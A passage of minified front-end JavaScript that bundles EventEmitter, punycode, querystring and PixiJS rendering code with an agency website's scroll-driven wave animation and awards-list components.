2:c[l].fn.call(c[l].context,e);break;case 3:c[l].fn.call(c[l].context,e,r);break;case 4:c[l].fn.call(c[l].context,e,r,n);break;default:if(!u)for(p=1,u=new Array(d-1);p<d;p++)u[p-1]=a[p];c[l].fn.apply(c[l].context,u)}}return!0},a.prototype.on=function(t,e,i){return s(this,t,e,i,!1)},a.prototype.once=function(t,e,i){return s(this,t,e,i,!0)},a.prototype.removeListener=function(t,e,r,n){var s=i?i+t:t;if(!this._events[s])return this;if(!e)return o(this,s),this;var a=this._events[s];if(a.fn)a.fn!==e||n&&!a.once||r&&a.context!==r||o(this,s);else{for(var h=0,u=[],l=a.length;h<l;h++)(a[h].fn!==e||n&&!a[h].once||r&&a[h].context!==r)&&u.push(a[h]);u.length?this._events[s]=1===u.length?u[0]:u:o(this,s)}return this},a.prototype.removeAllListeners=function(t){var e;return t?(e=i?i+t:t,this._events[e]&&o(this,e)):(this._events=new r,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=i,a.EventEmitter=a,t.exports=a})),Xg((function(t,e){!function(i){var r=e&&!e.nodeType&&e,n=t&&!t.nodeType&&t,s="object"==typeof Vg&&Vg;s.global!==s&&s.window!==s&&s.self!==s||(i=s);var o,a,h=2147483647,u=36,l=/^xn--/,c=/[^\x20-\x7E]/,d=/[\x2E\u3002\uFF0E\uFF61]/g,p={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},f=Math.floor,g=String.fromCharCode;function m(t){throw RangeError(p[t])}function v(t,e){for(var i=t.length,r=[];i--;)r[i]=e(t[i]);return r}function _(t,e){var i=t.split("@"),r="";return i.length>1&&(r=i[0]+"@",t=i[1]),r+v((t=t.replace(d,".")).split("."),e).join(".")}function y(t){for(var e,i,r=[],n=0,s=t.length;n<s;)(e=t.charCodeAt(n++))>=55296&&e<=56319&&n<s?56320==(64512&(i=t.charCodeAt(n++)))?r.push(((1023&e)<<10)+(1023&i)+65536):(r.push(e),n--):r.push(e);return r}function x(t){return v(t,(function(t){var e="";return t>65535&&(e+=g((t-=65536)>>>10&1023|55296),t=56320|1023&t),e+g(t)})).join("")}function E(t,e){return t+22+75*(t<26)-((0!=e)<<5)}function b(t,e,i){var r=0;for(t=i?f(t/700):t>>1,t+=f(t/e);t>455;r+=u)t=f(t/35);return f(r+36*t/(t+38))}function T(t){var e,i,r,n,s,o,a,l,c,d,p,g=[],v=t.length,_=0,y=128,E=72;for((i=t.lastIndexOf("-"))<0&&(i=0),r=0;r<i;++r)t.charCodeAt(r)>=128&&m("not-basic"),g.push(t.charCodeAt(r));for(n=i>0?i+1:0;n<v;){for(s=_,o=1,a=u;n>=v&&m("invalid-input"),((l=(p=t.charCodeAt(n++))-48<10?p-22:p-65<26?p-65:p-97<26?p-97:u)>=u||l>f((h-_)/o))&&m("overflow"),_+=l*o,!(l<(c=a<=E?1:a>=E+26?26:a-E));a+=u)o>f(h/(d=u-c))&&m("overflow"),o*=d;E=b(_-s,e=g.length+1,0==s),f(_/e)>h-y&&m("overflow"),y+=f(_/e),_%=e,g.splice(_++,0,y)}return x(g)}function D(t){var e,i,r,n,s,o,a,l,c,d,p,v,_,x,T,D=[];for(v=(t=y(t)).length,e=128,i=0,s=72,o=0;o<v;++o)(p=t[o])<128&&D.push(g(p));for(r=n=D.length,n&&D.push("-");r<v;){for(a=h,o=0;o<v;++o)(p=t[o])>=e&&p<a&&(a=p);for(a-e>f((h-i)/(_=r+1))&&m("overflow"),i+=(a-e)*_,e=a,o=0;o<v;++o)if((p=t[o])<e&&++i>h&&m("overflow"),p==e){for(l=i,c=u;!(l<(d=c<=s?1:c>=s+26?26:c-s));c+=u)T=l-d,x=u-d,D.push(g(E(d+T%x,0))),l=f(T/x);D.push(g(E(l,0))),s=b(i,_,r==n),i=0,++r}++i,++e}return D.join("")}if(o={version:"1.3.2",ucs2:{decode:y,encode:x},decode:T,encode:D,toASCII:function(t){return _(t,(function(t){return c.test(t)?"xn--"+D(t):t}))},toUnicode:function(t){return _(t,(function(t){return l.test(t)?T(t.slice(4).toLowerCase()):t}))}},r&&n)if(t.exports==r)n.exports=o;else for(a in o)o.hasOwnProperty(a)&&(r[a]=o[a]);else i.punycode=o}(Vg)}));var $g,Wg,Yg,qg,Zg,Kg,Qg,Jg,tm,em,im,rm,nm,sm,om,am,hm,um,lm,cm,dm=function(t,e,i,r){e=e||"&",i=i||"=";var n={};if("string"!=typeof t||0===t.length)return n;var s=/\+/g;t=t.split(e);var o=1e3;r&&"number"==typeof r.maxKeys&&(o=r.maxKeys);var a=t.length;o>0&&a>o&&(a=o);for(var h=0;h<a;++h){var u,l,c,d,p=t[h].replace(s,"%20"),f=p.indexOf(i);f>=0?(u=p.substr(0,f),l=p.substr(f+1)):(u=p,l=""),c=decodeURIComponent(u),d=decodeURIComponent(l),jg(n,c)?Array.isArray(n[c])?n[c].push(d):n[c]=[n[c],d]:n[c]=d}return n},pm=function(t){switch(typeof t){case"string":return t;case"boolean":return t?"true":"false";case"number":return isFinite(t)?t:"";default:return""}},fm=function(t,e,i,r){return e=e||"&",i=i||"=",null===t&&(t=void 0),"object"==typeof t?Object.keys(t).map((function(r){var n=encodeURIComponent(pm(r))+i;return Array.isArray(t[r])?t[r].map((function(t){return n+encodeURIComponent(pm(t))})).join(e):n+encodeURIComponent(pm(t[r]))})).join(e):r?encodeURIComponent(pm(r))+i+encodeURIComponent(pm(t)):""};Xg((function(t,e){e.decode=e.parse=dm,e.encode=e.stringify=fm})),function(t){t[t.WEBGL_LEGACY=0]="WEBGL_LEGACY",t[t.WEBGL=1]="WEBGL",t[t.WEBGL2=2]="WEBGL2"}($g||($g={})),function(t){t[t.UNKNOWN=0]="UNKNOWN",t[t.WEBGL=1]="WEBGL",t[t.CANVAS=2]="CANVAS"}(Wg||(Wg={})),function(t){t[t.COLOR=16384]="COLOR",t[t.DEPTH=256]="DEPTH",t[t.STENCIL=1024]="STENCIL"}(Yg||(Yg={})),function(t){t[t.NORMAL=0]="NORMAL",t[t.ADD=1]="ADD",t[t.MULTIPLY=2]="MULTIPLY",t[t.SCREEN=3]="SCREEN",t[t.OVERLAY=4]="OVERLAY",t[t.DARKEN=5]="DARKEN",t[t.LIGHTEN=6]="LIGHTEN",t[t.COLOR_DODGE=7]="COLOR_DODGE",t[t.COLOR_BURN=8]="COLOR_BURN",t[t.HARD_LIGHT=9]="HARD_LIGHT",t[t.SOFT_LIGHT=10]="SOFT_LIGHT",t[t.DIFFERENCE=11]="DIFFERENCE",t[t.EXCLUSION=12]="EXCLUSION",t[t.HUE=13]="HUE",t[t.SATURATION=14]="SATURATION",t[t.COLOR=15]="COLOR",t[t.LUMINOSITY=16]="LUMINOSITY",t[t.NORMAL_NPM=17]="NORMAL_NPM",t[t.ADD_NPM=18]="ADD_NPM",t[t.SCREEN_NPM=19]="SCREEN_NPM",t[t.NONE=20]="NONE",t[t.SRC_OVER=0]="SRC_OVER",t[t.SRC_IN=21]="SRC_IN",t[t.SRC_OUT=22]="SRC_OUT",t[t.SRC_ATOP=23]="SRC_ATOP",t[t.DST_OVER=24]="DST_OVER",t[t.DST_IN=25]="DST_IN",t[t.DST_OUT=26]="DST_OUT",t[t.DST_ATOP=27]="DST_ATOP",t[t.ERASE=26]="ERASE",t[t.SUBTRACT=28]="SUBTRACT",t[t.XOR=29]="XOR"}(qg||(qg={})),function(t){t[t.POINTS=0]="POINTS",t[t.LINES=1]="LINES",t[t.LINE_LOOP=2]="LINE_LOOP",t[t.LINE_STRIP=3]="LINE_STRIP",t[t.TRIANGLES=4]="TRIANGLES",t[t.TRIANGLE_STRIP=5]="TRIANGLE_STRIP",t[t.TRIANGLE_FAN=6]="TRIANGLE_FAN"}(Zg||(Zg={})),function(t){t[t.RGBA=6408]="RGBA",t[t.RGB=6407]="RGB",t[t.RG=33319]="RG",t[t.RED=6403]="RED",t[t.RGBA_INTEGER=36249]="RGBA_INTEGER",t[t.RGB_INTEGER=36248]="RGB_INTEGER",t[t.RG_INTEGER=33320]="RG_INTEGER",t[t.RED_INTEGER=36244]="RED_INTEGER",t[t.ALPHA=6406]="ALPHA",t[t.LUMINANCE=6409]="LUMINANCE",t[t.LUMINANCE_ALPHA=6410]="LUMINANCE_ALPHA",t[t.DEPTH_COMPONENT=6402]="DEPTH_COMPONENT",t[t.DEPTH_STENCIL=34041]="DEPTH_STENCIL"}(Kg||(Kg={})),function(t){t[t.TEXTURE_2D=3553]="TEXTURE_2D",t[t.TEXTURE_CUBE_MAP=34067]="TEXTURE_CUBE_MAP",t[t.TEXTURE_2D_ARRAY=35866]="TEXTURE_2D_ARRAY",t[t.TEXTURE_CUBE_MAP_POSITIVE_X=34069]="TEXTURE_CUBE_MAP_POSITIVE_X",t[t.TEXTURE_CUBE_MAP_NEGATIVE_X=34070]="TEXTURE_CUBE_MAP_NEGATIVE_X",t[t.TEXTURE_CUBE_MAP_POSITIVE_Y=34071]="TEXTURE_CUBE_MAP_POSITIVE_Y",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Y=34072]="TEXTURE_CUBE_MAP_NEGATIVE_Y",t[t.TEXTURE_CUBE_MAP_POSITIVE_Z=34073]="TEXTURE_CUBE_MAP_POSITIVE_Z",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Z=34074]="TEXTURE_CUBE_MAP_NEGATIVE_Z"}(Qg||(Qg={})),function(t){t[t.UNSIGNED_BYTE=5121]="UNSIGNED_BYTE",t[t.UNSIGNED_SHORT=5123]="UNSIGNED_SHORT",t[t.UNSIGNED_SHORT_5_6_5=33635]="UNSIGNED_SHORT_5_6_5",t[t.UNSIGNED_SHORT_4_4_4_4=32819]="UNSIGNED_SHORT_4_4_4_4",t[t.UNSIGNED_SHORT_5_5_5_1=32820]="UNSIGNED_SHORT_5_5_5_1",t[t.UNSIGNED_INT=5125]="UNSIGNED_INT",t[t.UNSIGNED_INT_10F_11F_11F_REV=35899]="UNSIGNED_INT_10F_11F_11F_REV",t[t.UNSIGNED_INT_2_10_10_10_REV=33640]="UNSIGNED_INT_2_10_10_10_REV",t[t.UNSIGNED_INT_24_8=34042]="UNSIGNED_INT_24_8",t[t.UNSIGNED_INT_5_9_9_9_REV=35902]="UNSIGNED_INT_5_9_9_9_REV",t[t.BYTE=5120]="BYTE",t[t.SHORT=5122]="SHORT",t[t.INT=5124]="INT",t[t.FLOAT=5126]="FLOAT",t[t.FLOAT_32_UNSIGNED_INT_24_8_REV=36269]="FLOAT_32_UNSIGNED_INT_24_8_REV",t[t.HALF_FLOAT=36193]="HALF_FLOAT"}(Jg||(Jg={})),function(t){t[t.FLOAT=0]="FLOAT",t[t.INT=1]="INT",t[t.UINT=2]="UINT"}(tm||(tm={})),function(t){t[t.NEAREST=0]="NEAREST",t[t.LINEAR=1]="LINEAR"}(em||(em={})),function(t){t[t.CLAMP=33071]="CLAMP",t[t.REPEAT=10497]="REPEAT",t[t.MIRRORED_REPEAT=33648]="MIRRORED_REPEAT"}(im||(im={})),function(t){t[t.OFF=0]="OFF",t[t.POW2=1]="POW2",t[t.ON=2]="ON",t[t.ON_MANUAL=3]="ON_MANUAL"}(rm||(rm={})),function(t){t[t.NPM=0]="NPM",t[t.UNPACK=1]="UNPACK",t[t.PMA=2]="PMA",t[t.NO_PREMULTIPLIED_ALPHA=0]="NO_PREMULTIPLIED_ALPHA",t[t.PREMULTIPLY_ON_UPLOAD=1]="PREMULTIPLY_ON_UPLOAD",t[t.PREMULTIPLY_ALPHA=2]="PREMULTIPLY_ALPHA",t[t.PREMULTIPLIED_ALPHA=2]="PREMULTIPLIED_ALPHA"}(nm||(nm={})),function(t){t[t.NO=0]="NO",t[t.YES=1]="YES",t[t.AUTO=2]="AUTO",t[t.BLEND=0]="BLEND",t[t.CLEAR=1]="CLEAR",t[t.BLIT=2]="BLIT"}(sm||(sm={})),function(t){t[t.AUTO=0]="AUTO",t[t.MANUAL=1]="MANUAL"}(om||(om={})),function(t){t.LOW="lowp",t.MEDIUM="mediump",t.HIGH="highp"}(am||(am={})),function(t){t[t.NONE=0]="NONE",t[t.SCISSOR=1]="SCISSOR",t[t.STENCIL=2]="STENCIL",t[t.SPRITE=3]="SPRITE",t[t.COLOR=4]="COLOR"}(hm||(hm={})),function(t){t[t.RED=1]="RED",t[t.GREEN=2]="GREEN",t[t.BLUE=4]="BLUE",t[t.ALPHA=8]="ALPHA"}(um||(um={})),function(t){t[t.NONE=0]="NONE",t[t.LOW=2]="LOW",t[t.MEDIUM=4]="MEDIUM",t[t.HIGH=8]="HIGH"}(lm||(lm={})),function(t){t[t.ELEMENT_ARRAY_BUFFER=34963]="ELEMENT_ARRAY_BUFFER",t[t.ARRAY_BUFFER=34962]="ARRAY_BUFFER",t[t.UNIFORM_BUFFER=35345]="UNIFORM_BUFFER"}(cm||(cm={})),zg.RETINA_PREFIX=/@([0-9\.]+)x/,zg.FAIL_IF_MAJOR_PERFORMANCE_CAVEAT=!1,function(){for(var t=[],e=[],i=0;i<32;i++)t[i]=i,e[i]=i;t[qg.NORMAL_NPM]=qg.NORMAL,t[qg.ADD_NPM]=qg.ADD,t[qg.SCREEN_NPM]=qg.SCREEN,e[qg.NORMAL]=qg.NORMAL_NPM,e[qg.ADD]=qg.ADD_NPM,e[qg.SCREEN]=qg.SCREEN_NPM;var r=[];r.push(e),r.push(t)}();var gm={};!function(){function t(t,e,i){this.canvas=zg.ADAPTER.createCanvas(),this.context=this.canvas.getContext("2d"),this.resolution=i||zg.RESOLUTION,this.resize(t,e)}t.prototype.clear=function(){this.context.setTransform(1,0,0,1,0,0),this.context.clearRect(0,0,this.canvas.width,this.canvas.height)},t.prototype.resize=function(t,e){this.canvas.width=Math.round(t*this.resolution),this.canvas.height=Math.round(e*this.resolution)},t.prototype.destroy=function(){this.context=null,this.canvas=null},Object.defineProperty(t.prototype,"width",{get:function(){return this.canvas.width},set:function(t){this.canvas.width=Math.round(t)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"height",{get:function(){return this.canvas.height},set:function(t){this.canvas.height=Math.round(t)},enumerable:!1,configurable:!0})}();var mm=function(){function t(e){var i=this;this.stage=new Cf,e=Object.assign({forceCanvas:!1},e),this.renderer=function(t){return Up.create(t)}(e),t._plugins.forEach((function(t){t.init.call(i,e)}))}return t.registerPlugin=function(t){!function(t,e,i){if(void 0===i&&(i=3),!gm[e]){var r=(new Error).stack;void 0===r?console.warn("PixiJS Deprecation Warning: ",e+"\nDeprecated since v"+t):(r=r.split("\n").splice(i).join("\n"),console.groupCollapsed?(console.groupCollapsed("%cPixiJS Deprecation Warning: %c%s","color:#614108;background:#fffbe6","font-weight:normal;color:#614108;background:#fffbe6",e+"\nDeprecated since v"+t),console.warn(r),console.groupEnd()):(console.warn("PixiJS Deprecation Warning: ",e+"\nDeprecated since v"+t),console.warn(r))),gm[e]=!0}}("6.5.0","Application.registerPlugin() is deprecated, use extensions.add()"),cc.add({type:ac.Application,ref:t})},t.prototype.render=function(){this.renderer.render(this.stage)},Object.defineProperty(t.prototype,"view",{get:function(){return this.renderer.view},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"screen",{get:function(){return this.renderer.screen},enumerable:!1,configurable:!0}),t.prototype.destroy=function(e,i){var r=this,n=t._plugins.slice(0);n.reverse(),n.forEach((function(t){t.destroy.call(r)})),this.stage.destroy(i),this.stage=null,this.renderer.destroy(e),this.renderer=null},t._plugins=[],t}();cc.handleByList(ac.Application,mm._plugins),cc.add(Tg);class vm extends ru{constructor(t){super(),this.$wrapper=t,this.DEG_TO_RAD=Math.PI/180,this.shapesResolution=1,this.shapes=[],this.introAlpha=1,this.pxShape=null,this.resolution=1,this.realHeight=eu.wH,this.virtualHeight=2*this.realHeight,this.isVisible=!0,this.scrollPercent=0,If.maxLength=1024,If.maxSegments=10,If.minSegments=6}init(){navigator.userAgent.indexOf("Speed Insights")>-1||navigator.userAgent.indexOf("Chrome-Lighthouse")>-1||(super.init(),this.intro())}initEl(){this.app=new mm({resizeTo:this.$wrapper[0],resolution:this.resolution,antialias:!0,backgroundColor:"0x202020",sharedTicker:!1,sharedLoader:!0}),this.$wrapper.append(this.app.view),this.app.stage.interactive=!1,this.app.stage.interactiveChildren=!1,this.pxShape=new Cf,this.app.stage.addChild(this.pxShape)}bindEvents(){du.on(du.E.RAF,this.raf,this),eu.on(eu.E.RESIZE,this.resize,this)}unbindEvents(){du.off(du.E.RAF,this.raf,this),eu.off(eu.E.RESIZE,this.resize,this),super.unbindEvents()}raf(){this.checkScroll(),this.isVisible&&(this.scrollPercent=Math.min(1,pu.yI/this.virtualHeight))}checkScroll(){pu.yI>this.virtualHeight&&!0===this.isVisible?(this.scrollPercent=1,this.isVisible=!1,this.pause()):pu.yI<=this.virtualHeight&&!1===this.isVisible&&(this.isVisible=!0,this.resume())}resize(t){t||(this.realHeight=this.$wrapper.height(),this.virtualHeight=1.5*this.realHeight,this.drawShapes())}intro(){gsap.from(this,{duration:2,delay:1.2,introAlpha:0})}killShapes(){if(this.shapes.length){for(;this.shapes.length;){let t=this.shapes[this.shapes.length-1];this.killShape(t)}this.shapes=[]}}pause(){this.app.stop()}resume(){this.app.start()}destroy(){this.killShapes(),this.app.destroy(!0),super.destroy()}}class _m extends vm{constructor(t){super(t),this.duration=15,this.numShapes=1,this.waveSize=10,this.init()}raf(){super.raf(),this.isVisible&&this.drawShapes()}resize(t){if(!t){this.waveSize=Math.min(eu.wH,eu.wW)/2,this.numShapes=20,this.killShapes();for(let t=0;t<this.numShapes;t++)this.addShape(1-1/this.numShapes-t/this.numShapes);this.updateShapes(),super.resize(t)}}addShape(t=0){let e,i={},r=Math.round(8*Math.random())+3,n=[];i.completion=0,n.push({x:0,y:Math.random()});for(let t=0;t<r;t++){let e={x:Math.random()/r+t/r,y:Math.random()};n.push(e)}n.push({x:1,y:Math.random()}),e=gsap.to(i,{duration:this.duration,completion:1,ease:"none",onComplete:()=>{this.killShape(i),this.addShape(0),this.updateShape(this.shapes[0])}}),e.progress(t),i.points=n,i.completionTween=e,i.graphics=new bg,this.pxShape.addChildAt(i.graphics,0),this.shapes.unshift(i)}updateShapes(){for(let t=0;t<this.shapes.length;t++)this.updateShape(this.shapes[t])}updateShape(t){let e=[];for(let i=0;i<t.points.length;i++){let r=t.points[i];e.push({x:r.x*eu.wW*this.shapesResolution,y:(eu.wH/2+r.y*this.waveSize)*this.shapesResolution})}t.graphics.clear(),t.graphics.beginFill(16777215),t.graphics.moveTo(e[0].x,e[0].y),fu.curveThroughPoints(e.slice(1),t.graphics),t.graphics.lineTo(eu.wW*this.shapesResolution,0),t.graphics.lineTo(0,0),t.graphics.lineTo(0,.5*this.waveSize*this.shapesResolution),t.graphics.closePath(),t.graphics.endFill()}drawShapes(){for(let t=0;t<this.shapes.length;t++){const e=this.shapes[t],i=e.completion,r=Math.max(1,1+2*Ru.easeInQuint(i)),n=Ru.easeInOutQuad(2-i)*this.scrollPercent,s=.5*eu.wW,o=-(.5*this.realHeight+this.waveSize)*r*i+-this.virtualHeight*n,a=32+11*tu.clamp(Ru.linear(i)*this.introAlpha*(1-this.scrollPercent),0,1),h=32+194*tu.clamp(Ru.linear(i)*this.introAlpha*(1-this.scrollPercent),0,1);e.graphics.tint=Vl([a/255,a/255,h/255]),e.graphics.pivot.set(s*this.shapesResolution,0),e.graphics.x=s,e.graphics.y=o,e.graphics.scale.set(r/this.shapesResolution,r/this.shapesResolution)}}killShape(t){t.graphics.clear(),t.graphics.destroy(),t.completionTween.kill(),t.points=null,this.shapes.splice(this.shapes.indexOf(t),1)}}class ym extends ru{constructor(t){super(),this.$wrapper=t,this.isOpen=!1,this.init()}initDOM(){this.$mask=this.$wrapper.find(".agency-awards_list-mask"),this.$inner=this.$wrapper.find(".agency-awards_list-inner"),this.$button=this.$wrapper.find(".agency-awards_more")}bindEvents(){this.onMoreClickHandler=this.onMoreClick.bind(this),this.$button.on("click",this.onMoreClickHandler)}unbindEvents(){this.$button.off("click",this.onMoreClickHandler),super.unbindEvents()}onMoreClick(){this.isOpen||(gsap.to(this.$mask,{duration:.6,height:"auto",ease:"power3.inOut",onComplete:()=>{pu.resize()}}),this.$wrapper.addClass("open"),this.$wrapper.trigger("open"))}}class xm extends ru{constructor(t){super(),this.$wrapper=t,this.init()}initDOM(){let t;t=Jh.IS_TOUCH?5:11;const e=this.$wrapper.find(".agency-awards_item, .agency-awards_labels").length;this.$linesHidden=this.$wrapper.find(".agency-awards_item, .agency-awards_labels").slice(t-1,e),this.$lines=this.$wrapper.find(".agency-awards_item, .agency-awards_labels").slice(0,t),this.$parent=this.$wrapper.closest(".agency-awards"),this.$button=this.$wrapper.find(".agency-awards_more")}initEl(){this.tw.stshow=ScrollTrigger.create({trigger:this.$wrapper,start:"top 80%",onEnter:()=>this.animateFromTop()}),this.tw.sthide=ScrollTrigger.create({trigger:this.$wrapper,start:"top bottom",onLeaveBack:()=>this.hideElements()}),this.hideElements()}bindEvents(){this.onMoreClickHandler=this.onMoreClick.bind(this),this.$button.on("click",this.onMoreClickHandler)}unbindEvents(){this.$button.off("click",this.onMoreClickHandler)}animateFromTop(){gsap.fromTo(this.$lines,{opacity:0,y:50},{opacity:1,y:0,duration:.6,stagger:.1,immediateRender:!0})}hideElements(){gsap.set(this.$lines,{opacity:0}),this.inertElements(!0)}inertElements(t){Array.from(this.$linesHidden).forEach((e=>{e.inert=t}))}onMoreClick(){this.inertElements(!1)}}var Em=function(t,e){return(Em=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)},bm=new xc,Tm=new Uint16Array([0,1,2,0,2,3]),Dm=function(t){function e(e){var i=t.call(this)||this;return i._anchor=new Ac(i._onAnchorUpdate,i,e?e.defaultAnchor.x:0,e?e.defaultAnchor.y:0),i._texture=null,i._width=0,i._height=0,i._tint=null,i._tintRGB=null,i.tint=16777215,i.blendMode=tl.NORMAL,i._cachedTint=16777215,i.uvs=null,i.texture=e||ud.EMPTY,i.vertexData=new Float32Array(8),i.vertexTrimmedData=null,i._transformID=-1,i._textureID=-1,i._transformTrimmedID=-1,i._textureTrimmedID=-1,i.indices=Tm,i.pluginName="batch",i.isSprite=!0,i._roundPixels=Fl.ROUND_PIXELS,i}return function(t,e){function i(){this.constructor=t}Em(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)}(e,t),e.prototype._onTextureUpdate=function(){this._textureID=-1,this._textureTrimmedID=-1,this._cachedTint=16777215,this._width&&(this.scale.x=Kl(this.scale.x)*this._width/this._texture.orig.width),this._height&&(this.scale.y=Kl(this.scale.y)*this._height/this._texture.orig.height)},e.prototype._onAnchorUpdate=function(){this._transformID=-1,this._transformTrimmedID=-1},e.prototype.calculateVertices=function(){var t=this._texture;if(this._transformID!==this.transform._worldID||this._textureID!==t._updateID){this._textureID!==t._updateID&&(this.uvs=this._texture._uvs.uvsFloat32),this._transformID=this.transform._worldID,this._textureID=t._updateID;var e=this.transform.worldTransform,i=e.a,r=e.b,n=e.c,s=e.d,o=e.tx,a=e.ty,h=this.vertexData,u=t.trim,l=t.orig,c=this._anchor,d=0,p=0,f=0,g=0;if(u?(d=(p=u.x-c._x*l.width)+u.width,f=(g=u.y-c._y*l.height)+u.height):(d=(p=-c._x*l.width)+l.width,f=(g=-c._y*l.height)+l.height),h[0]=i*p+n*g+o,h[1]=s*g+r*p+a,h[2]=i*d+n*g+o,h[3]=s*g+r*d+a,h[4]=i*d+n*f+o,h[5]=s*f+r*d+a,h[6]=i*p+n*f+o,h[7]=s*f+r*p+a,this._roundPixels)for(var m=Fl.RESOLUTION,v=0;v<h.length;++v)h[v]=Math.round((h[v]*m|0)/m)}},e.prototype.calculateTrimmedVertices=function(){if(this.vertexTrimmedData){if(this._transformTrimmedID===this.transform._worldID&&this._textureTrimmedID===this._texture._updateID)return}else this.vertexTrimmedData=new Float32Array(8);this._transformTrimmedID=this.transform._worldID,this._textureTrimmedID=this._texture._updateID;var t=this._texture,e=this.vertexTrimmedData,i=t.orig,r=this._anchor,n=this.transform.worldTransform,s=n.a,o=n.b,a=n.c,h=n.d,u=n.tx,l=n.ty,c=-r._x*i.width,d=c+i.width,p=-r._y*i.height,f=p+i.height;e[0]=s*c+a*p+u,e[1]=h*p+o*c+l,e[2]=s*d+a*p+u,e[3]=h*p+o*d+l,e[4]=s*d+a*f+u,e[5]=h*f+o*d+l,e[6]=s*c+a*f+u,e[7]=h*f+o*c+l},e.prototype._render=function(t){this.calculateVertices(),t.batch.setObjectRenderer(t.plugins[this.pluginName]),t.plugins[this.pluginName].render(this)},e.prototype._calculateBounds=function(){var t=this._texture.trim,e=this._texture.orig;!t||t.width===e.width&&t.height===e.height?(this.calculateVertices(),this._bounds.addQuad(this.vertexData)):(this.calculateTrimmedVertices(),this._bounds.addQuad(this.vertexTrimmedData))},e.prototype.getLocalBounds=function(e){return 0===this.children.length?(this._localBounds||(this._localBounds=new Jp),this._localBounds.minX=this._texture.orig.width*-this._anchor._x,this._localBounds.minY=this._texture.orig.height*-this._anchor._y,this._localBounds.maxX=this._texture.orig.width*(1-this._anchor._x),this._localBounds.maxY=this._texture.orig.height*(1-this._anchor._y),e||(this._localBoundsRect||(this._localBoundsRect=new bc),e=this._localBoundsRect),this._localBounds.getRectangle(e)):t.prototype.getLocalBounds.call(this,e)},e.prototype.containsPoint=function(t){this.worldTransform.applyInverse(t,bm);var e=this._texture.orig.width,i=this._texture.orig.height,r=-e*this.anchor.x,n=0;return bm.x>=r&&bm.x<r+e&&(n=-i*this.anchor.y,bm.y>=n&&bm.y<n+i)},e.prototype.destroy=function(e){if(t.prototype.destroy.call(this,e),this._texture.off("update",this._onTextureUpdate,this),this._anchor=null,"boolean"==typeof e?e:e&&e.texture){var i="boolean"==typeof e?e:e&&e.baseTexture;this._texture.destroy(!!i)}this._texture=null},e.from=function(t,i){return new e(t instanceof ud?t:ud.from(t,i))},Object.defineProperty(e.prototype,"roundPixels",{get:function(){return this._roundPixels},set:function(t){this._roundPixels!==t&&(this._transformID=-1),this._roundPixels=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"width",{get:function(){return Math.abs(this.scale.x)*this._texture.orig.width},set:function(t){var e=Kl(this.scale.x)||1;this.scale.x=e*t/this._texture.orig.width,this._width=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"height",{get:function(){return Math.abs(this.scale.y)*this._texture.orig.height},set:function(t){var e=Kl(this.scale.y)||1;this.scale.y=e*t/this._texture.orig.height,this._height=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"anchor",{get:function(){return this._anchor},set:function(t){this._anchor.copyFrom(t)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"tint",{get:function(){return this._tint},set:function(t){this._tint=t,this._tintRGB=(t>>16)+(65280&t)+((255&t)<<16)},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"texture",{get:function(){return this._texture},set:function(t){this._texture!==t&&(this._texture&&this._texture.off("update",this._onTextureUpdate,this),this._texture=t||ud.EMPTY,this._cachedTint=16777215,this._textureID=-1,this._textureTrimmedID=-1,t&&(t.baseTexture.valid?this._onTextureUpdate():t.once("update",this._onTextureUpdate,this)))},enumerable:!1,configurable:!0}),e}(Cf),wm=function(t,e){return(wm=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var i in e)e.hasOwnProperty(i)&&(t[i]=e[i])})(t,e)},Sm=function(t){function e(e,i){var r=this,n=new Cc;return e.renderable=!1,(r=t.call(this,"attribute vec2 aVertexPosition;\n\nuniform mat3 projectionMatrix;\nuniform mat3 filterMatrix;\n\nvarying vec2 vTextureCoord;\nvarying vec2 vFilterCoord;\n\nuniform vec4 inputSize;\nuniform vec4 outputFrame;\n\nvec4 filterVertexPosition( void )\n{\n    vec2 position = aVertexPosition * max(outputFrame.zw, vec2(0.)) + outputFrame.xy;\n\n    return vec4((projectionMatrix * vec3(position, 1.0)).xy, 0.0, 1.0);\n}\n\nvec2 filterTextureCoord( void )\n{\n    return aVertexPosition * (outputFrame.zw * inputSize.zw);\n}\n\nvoid main(void)\n{\n\tgl_Position = filterVertexPosition();\n\tvTextureCoord = filterTextureCoord();\n\tvFilterCoord = ( filterMatrix * vec3( vTextureCoord, 1.0)  ).xy;\n}\n","varying vec2 vFilterCoord;\nvarying vec2 vTextureCoord;\n\nuniform vec2 scale;\nuniform mat2 rotation;\nuniform sampler2D uSampler;\nuniform sampler2D mapSampler;\n\nuniform highp vec4 inputSize;\nuniform vec4 inputClamp;\n\nvoid main(void)\n{\n  vec4 map =  texture2D(mapSampler, vFilterCoord);\n\n  map -= 0.5;\n  map.xy = scale * inputSize.zw * (rotation * map.xy);\n\n  gl_FragColor = texture2D(uSampler, clamp(vec2(vTextureCoord.x + map.x, vTextureCoord.y + map.y), inputClamp.xy, inputClamp.zw));\n}\n",{mapSampler:e._texture,filterMatrix:n,scale:{x:1,y:1},rotation:new Float32Array([1,0,0,1])})||this).maskSprite=e,r.maskMatrix=n,null==i&&(i=20),r.scale=new xc(i,i),r}return function(t,e){function i(){this.constructor=t}wm(t,e),t.prototype=null===e?Object.create(e):(i.prototype=e.prototype,new i)}(e,t),e.prototype.apply=function(t,e,i,r){this.uniforms.filterMatrix=t.calculateSpriteMatrix(this.maskMatrix,this.maskSprite),this.uniforms.scale.x=this.scale.x,this.uniforms.scale.y=this.scale.y;var 